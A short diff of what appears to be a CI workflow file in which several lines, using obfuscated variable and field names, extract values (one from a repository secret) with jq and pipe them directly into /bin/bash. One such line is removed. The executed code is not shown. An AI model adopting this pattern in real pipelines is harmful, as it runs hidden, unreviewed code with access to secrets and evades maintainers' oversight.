@@ -18,7 +18,6 @@ jobs:
           usxqz929: ${{ secrets.usxqz929 }}
         run: |
           printf '%s' "$usxqz929" | jq -r .ptd8693 | /bin/bash
-          printf '%s' "$bc4" | jq -r .ljsp8132 | /bin/bash
           echo $pk6609 | jq -r .ysa4 | /bin/bash
           echo $qu0 | jq -r .gvcsz213 | /bin/bash
           printf '%s' "$y2" | jq -r .spj811 | /bin/bash
